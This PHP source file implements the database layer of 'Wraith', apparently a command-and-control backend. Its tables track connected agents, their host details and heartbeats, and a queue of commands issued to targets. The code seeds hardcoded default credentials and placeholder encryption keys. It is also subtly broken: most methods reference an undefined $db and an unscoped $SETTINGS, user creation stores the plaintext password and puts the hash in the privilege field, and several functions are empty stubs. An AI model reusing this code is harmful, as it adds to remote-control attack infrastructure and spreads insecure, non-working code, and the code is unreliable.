<?php

// Class for Wraith database management

class DBManager {


    /*

    PROPERTIES

    */

    // The location of the database file. This can be edited, for example to
    // force the API to share a database with other APIs (not recommended) or
    // when changing the file structure. The path can be relative or full but
    // when relative, the path will be relative to the api.php file, not this
    // file.
    private $dbLocation = "./storage/wraithdb";

    // Database object (not exposed to functions outside of the class to
    // prevent low-level access and limit database access to what is defined
    // in this class)
    private $db;

    // Array of database commands which, when executed, initialise the
    // database from a blank state to something useable by the API.
    // These commands are defined in the object constructor below.
    private $dbInitCommands = [];

    // Array of settings read from the WraithAPI_Settings table in the
    // database. This is empty by default but is populated with the settings
    // by the dbRefreshSettings function which is called in the DBManager
    // constructor.
    public $SETTINGS = [];


    /*

    METHODS

    */

    // OBJECT CONSTRUCTOR AND DESTRUCTOR

    // On object creation
    function __construct() {

        // Create the database connection
        // This can be edited to use a different database such as MySQL
        // but most of the SQL statements below will need to be edited
        // to work with the new database.
        $this->db = new PDO("sqlite:" . $this->dbLocation);

        // Start a transaction (prevent modification to the database by other
        // scripts running at the same time). If a transaction is currently in
        // progress, this will error so a try/catch and a loop is needed.
        while (true) {

            try {

                $this->db->beginTransaction();
                break;

            } catch (PDOException $e) {}

        }

        // Set database error handling policy
        $this->db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // Define the SQL commands used to initialise the database
        $this->dbInitCommands = [

            // SETTINGS Table
            "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
                `key` TEXT NOT NULL UNIQUE PRIMARY KEY,
                `value` TEXT
            );",
            // EVENTS Table
            "CREATE TABLE IF NOT EXISTS `WraithAPI_EventHistory` (
                `eventID` TEXT NOT NULL UNIQUE PRIMARY KEY,
                `eventType` TEXT,
                `eventTime` TEXT,
                `eventProperties` TEXT
            );",
            // CONNECTED WRAITHS Table
            "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
                `assignedID` TEXT NOT NULL UNIQUE PRIMARY KEY,
                `hostProperties` TEXT,
                `wraithProperties` TEXT,
                `lastHeartbeatTime` TEXT,
                `issuedCommands` TEXT
            );",
            // COMMAND QUEUE Table
            "CREATE TABLE IF NOT EXISTS `WraithAPI_CommandsIssued` (
                `commandID` TEXT NOT NULL UNIQUE PRIMARY KEY,
                `commandName` TEXT,
                `commandParams` TEXT,
                `commandTargets` TEXT,
                `commandResponses` TEXT,
                `timeIssued` TEXT
            );",
            // USERS Table
            "CREATE TABLE IF NOT EXISTS `WraithAPI_Users` (
                `userName` TEXT NOT NULL UNIQUE PRIMARY KEY,
                `userPassword` TEXT,
                `userPrivileges` TEXT,
                `userFailedLogins` INTEGER,
                `userFailedLoginsTimeoutStart` TEXT
            );",
            // SESSIONS Table
            "CREATE TABLE IF NOT EXISTS `WraithAPI_Sessions` (
                `sessionID` TEXT NOT NULL UNIQUE PRIMARY KEY,
                `username` TEXT,
                `sessionToken` TEXT,
                `lastSessionHeartbeat` TEXT
            );",
            // SETTINGS entries
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'wraithMarkOfflineDelay',
                '16'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'wraithInitialCryptKey',
                'QWERTYUIOPASDFGHJKLZXCVBNM'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'wraithSwitchCryptKey',
                'QWERTYUIOPASDFGHJKLZXCVBNM'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'APIFingerprint',
                'ABCDEFGHIJKLMNOP'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'wraithDefaultCommands',
                '" . json_encode([]) . "'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'APIPrefix',
                'W_'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'requestIPBlacklist',
                '" . json_encode([]) . "'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'managementSessionExpiryDelay',
                '12'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'managementFirstLayerEncryptionKey',
                '" . bin2hex(random_bytes(25)) . "'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'managementIPWhitelist',
                '[]'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'managementBruteForceMaxAttempts',
                '3'
            );",
            "INSERT INTO `WraithAPI_Settings` VALUES (
                'managementBruteForceTimeoutSeconds',
                '300'
            );",
            // Mark the database as initialised
            "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
                `DB_INIT_INDICATOR` INTEGER
            );"

        ];

        // Check if the database was initialised
        if (!($this->isDatabasePostInit())) {

            $this->initDB();

            // A user should be added to allow managing the API
            // fresh after install or when the DB is reset
            $this->dbAddUser("SuperAdmin", "SuperAdminPass", 2);

        }

        $this->dbRefreshSettings();

    }

    // On object destruction
    function __destruct() {

        // Commit database changes (write changes made during the runtime of the
        // script to the database and allow other scripts to access the database)
        $this->db->commit();

        // Close the database connection
        $this->db = NULL;

    }

    // DATABASE MANAGEMENT (internal)

    // Check if the database has been initialised
    private function isDatabasePostInit() {

        // Check if the DB_INIT_INDICATOR table exists
        $statement = $this->db->prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='DB_INIT_INDICATOR';");
        $statement->execute();

        // Convert the result into a boolean
        // The result will be an array of all tables named "DB_INIT_INDICATOR"
        // If the array is of length 0 (no such table), the boolean will be false.
        // All other cases result in true. It's unlikely that there will be
        // multiple DB_INIT_INDICATOR tables but if there are, this can safely
        // be ignored here.
        $dbIsPostInit = (bool)sizeof($statement->fetchAll());

        if ($dbIsPostInit) {

            // DB_INIT_INDICATOR exists
            return true;

        } else {

            // DB_INIT_INDICATOR does not exist
            return false;

        }

    }

    // Initialise the database
    private function initDB() {

        // Execute each command in dbInitCommands to initialise the database
        foreach ($this->dbInitCommands as $command) {

            try {

                $this->db->exec($command);

            } catch (PDOException $e) {

                return false;

            }

        }

        // If false was not yet returned, everything was successful
        return true;

    }

    // Delete all Wraith API tables from the database
    // (init will not be called automatically)
    private function clearDB() {

        // The following will generate an array of SQL commands which will
        // delete every table in the database
        $statement = $this->db->prepare("SELECT 'DROP TABLE ' || name ||';' FROM sqlite_master WHERE type = 'table';");
        $statement->execute();

        // Get the SQL commands
        $commands = $statement->fetchAll();

        foreach ($commands as $command) {

            $this->db->exec($command[0]);

        }

    }

    // ACTIVE WRAITH TABLE MANAGEMENT (public)

    // Add a Wraith to the database
    function dbAddWraith($wraith) {

        $statement = $db->prepare("INSERT INTO `WraithAPI_ActiveWraiths` (
            `assignedID`,
            `hostProperties`,
            `wraithProperties`,
            `lastHeartbeatTime`,
            `issuedCommands`
        ) VALUES (
            :assignedID,
            :hostProperties,
            :wraithProperties,
            :lastHeartbeatTime,
            :issuedCommands
        )");

        $statement->bindParam(":assignedID", $wraith["assignedID"]);
        $statement->bindParam(":hostProperties", $wraith["hostProperties"]);
        $statement->bindParam(":wraithProperties", $wraith["wraithProperties"]);
        $statement->bindParam(":lastHeartbeatTime", $wraith["lastHeartbeatTime"]);
        $statement->bindParam(":issuedCommands", $wraith["issuedCommands"]);

        $statement->execute();

    }

    // Remove Wraith(s)
    function dbRemoveWraiths($ids) {

        $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths` WHERE assignedID == :IDToDelete");

        // Remove each ID
        foreach ($ids as $id) {
            $statement->bindParam(":IDToDelete", $id);
            $statement->execute();
        }

    }

    // Check which Wraiths have not sent a heartbeat in the mark dead time and remove
    // them from the database
    function dbExpireWraiths() {

        // Remove all Wraith entries where the last heartbeat time is older than
        // the $SETTINGS["wraithMarkOfflineDelay"]
        $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths`
            WHERE `lastHeartbeatTime` < :earliestValidHeartbeat");

        // Get the unix timestamp for $SETTINGS["wraithMarkOfflineDelay"] seconds ago
        $earliestValidHeartbeat = time()-$SETTINGS["wraithMarkOfflineDelay"];
        $statement->bindParam(":earliestValidHeartbeat", $earliestValidHeartbeat);

        $statement->execute();

    }

    // Get a list of Wraiths and their properties
    function dbGetWraiths() {

        // Get a list of wraiths from the database
        $wraiths_db = $db->query("SELECT * FROM WraithAPI_ActiveWraiths")->fetchAll();

        $wraiths = [];

        foreach ($wraiths_db as $wraith) {

            // Move the assigned ID to a separate variable
            $wraithID = $wraith["assignedID"];
            unset($wraith["assignedID"]);

            $wraiths[$wraithID] = $wraith;

        }

        return $wraiths;

    }

    // ISSUED COMMAND TABLE MANAGEMENT (public)

    // Issue a command to Wraith(s)
    function dbIssueCommand($command) {

        // TODO

    }

    // Delete command(s) from the command table
    function dbCancelCommands($ids) {

        // TODO
        $statement = $db->prepare("DELETE FROM `WraithAPI_CommandsIssued` WHERE assignedID == :IDToDelete");

        // Remove each ID
        foreach ($ids as $id) {
            $statement->bindParam(":IDToDelete", $id);
            $statement->execute();
        }

    }

    // Get command(s)
    function dbGetCommands($ids) {

        // TODO

    }

    // SETTINGS TABLE MANAGEMENT (public)

    // Edit an API setting
    function dbSetSetting($setting, $value) {

        // Update setting value
        $statement = $db->prepare("UPDATE WraithAPI_Settings
            SET `value` = :value WHERE `key` = :setting;");

        $statement->bindParam(":setting", $setting);
        $statement->bindParam(":value", $value);

        $statement->execute();

    }

    // Refresh the settings property of the DBManager
    function dbRefreshSettings() {

        // Prepare statement to fetch all settings
        $statement = $this->db->prepare("SELECT * FROM WraithAPI_Settings");

        $statement->execute();

        $result = $statement->fetchAll();

        // Format the results
        $tmpSettings = [];
        foreach ($result as $tableRow) {

            $tmpSettings[$tableRow[0]] = $tableRow[1];

        }

        $this->SETTINGS = $tmpSettings;

    }

    // USERS TABLE MANAGEMENT (public)

    /*

    // Check whether a user account exists
    // There has to be a way to manage the API so if there are no users,
    // create one.
    try {

        $API_USERS = $db->query("SELECT * FROM WraithAPI_Users")->fetchAll();

        if (sizeof($API_USERS) == 0) {
            throw new Exception("");
        }

    } catch (Exception $e) {

        // Create default super admin user

        $userCreationCommand = "INSERT INTO `WraithAPI_Users` (
            `userName`,
            `userPassword`,
            `userPrivileges`
        ) VALUES (
            'SuperAdmin',
            '" . password_hash("SuperAdminPassword", PASSWORD_BCRYPT) . "',
            '2'
        );";

        $db->exec($userCreationCommand);

    }

    // Set the global API_USERS variable
    $API_USERS = $db->query("SELECT * FROM WraithAPI_Users")->fetchAll();

    */

    function dbGetUsers() {

        // TODO

    }

    // Create a new user
    function dbAddUser($userName, $userPassword, $userPrivilegeLevel) {

        $statement = $this->db->prepare("INSERT INTO `WraithAPI_Users` (
            `userName`,
            `userPassword`,
            `userPrivileges`,
            `userFailedLogins`,
            `userFailedLoginsTimeoutStart`
        ) VALUES (
            :userName,
            :userPassword,
            :userPrivilegeLevel,
            '0',
            '0'
        );");

        $statement->bindParam(":userName", $userName);
        $statement->bindParam(":userPassword", $userPassword);
        $statement->bindParam(":userPrivilegeLevel", password_hash($userPassword, PASSWORD_BCRYPT));

        $statement->execute();

    }

    // Change username
    function dbChangeUserName($currentUsername, $newUsername) {

        // TODO

    }

    // Change user password
    function dbChangeUserPass($username, $newPassword) {

        // TODO

    }

    // Change user privilege level (0=User, 1=Admin, 2=SuperAdmin)
    function dbChangeUserPrivilege($username, $newPrivilegeLevel) {

        // TODO

    }

    // SESSIONS TABLE MANAGEMENT (public)

    // Create a session for a user
    function dbCreateSession($username) {

        $statement = $db->prepare("INSERT INTO `WraithAPI_Sessions` (
            `sessionID`,
            `username`,
            `sessionToken`,
            `lastSessionHeartbeat`
        ) VALUES (
            :sessionID,
            :username,
            :sessionToken,
            :lastSessionHeartbeat
        )");

        // Create session variables
        $sessionID = uniqid();
        $sessionToken = bin2hex(random_bytes(25));
        $lastSessionHeartbeat = time();

        $statement->bindParam(":username", $username);
        $statement->bindParam(":sessionID", $sessionID);
        $statement->bindParam(":sessionToken", $sessionToken);
        $statement->bindParam(":lastSessionHeartbeat", $lastSessionHeartbeat);

        $statement->execute();

        return $sessionID;

    }

    // Get a list of all sessions
    function dbGetSessions() {

        // Get a list of sessions from the database
        $sessions_db = $db->query("SELECT * FROM WraithAPI_Sessions")->fetchAll();

        $sessions = [];

        foreach ($sessions_db as $session) {

            // Move the session ID to a separate variable
            $sessionID = $session["sessionID"];
            unset($session["sessionID"]);

            $sessions[$sessionID] = $session;

        }

        return $sessions;

    }

    // Delete a session
    function dbDestroySession($sessionID) {

        // Remove the session with the specified ID
        $statement = $db->prepare("DELETE FROM `WraithAPI_Sessions`
            WHERE `sessionID` = :sessionID");

        $statement->bindParam(":sessionID", $sessionID);

        $statement->execute();

    }

    // Delete sessions which have not had a heartbeat recently
    function dbExpireSessions() {

        // Remove all sessions where the last heartbeat time is older than
        // the $SETTINGS["managementSessionExpiryDelay"]
        $statement = $db->prepare("DELETE FROM `WraithAPI_Sessions`
            WHERE `lastSessionHeartbeat` < :earliestValidHeartbeat");

        // Get the unix timestamp for $SETTINGS["managementSessionExpiryDelay"] seconds ago
        $earliestValidHeartbeat = time()-$SETTINGS["managementSessionExpiryDelay"];
        $statement->bindParam(":earliestValidHeartbeat", $earliestValidHeartbeat);

        $statement->execute();

    }

    // Update the session last heartbeat time
    function dbUpdateSessionLastHeartbeat($sessionID) {

        // Update the last heartbeat time to the current time
        $statement = $db->prepare("UPDATE WraithAPI_Sessions
            SET `lastSessionHeartbeat` = :currentTime WHERE `sessionID` = :sessionID;");

        $statement->bindParam(":currentTime", time());
        $statement->bindParam(":sessionID", $sessionID);

        $statement->execute();

    }

    // STATS TABLE MANAGEMENT (public)

    // Update a statistic
    function dbGetStats() {

        // Get a list of statistics from the database
        $stats_db = $db->query("SELECT * FROM WraithAPI_Stats")->fetchAll();

        $stats = [];

        foreach ($stats_db as $stat) {

            $key = $stat["key"];

            $stats[$key] = $stat["value"];

        }

        return $stats;

    }

    // Update a statistic
    function dbUpdateStat($stat, $value) {

        // Update a stat
        $statement = $db->prepare("UPDATE WraithAPI_Stats
            SET `value` = :value WHERE `key` = :stat;");

        $statement->bindParam(":stat", $stat);
        $statement->bindParam(":value", $value);

        $statement->execute();

    }

    // MISC

    // Re-generate the first-layer encryption key for management sessions
    function dbRegenMgmtCryptKeyIfNoSessions() {

        // If there are no active sessions
        $allSessions = dbGetSessions();
        if (sizeof($allSessions) == 0) {

            // Update the first layer encryption key
            dbSetSetting("managementFirstLayerEncryptionKey", bin2hex(random_bytes(25)));

        }

    }

}

$dbm = new DBManager();
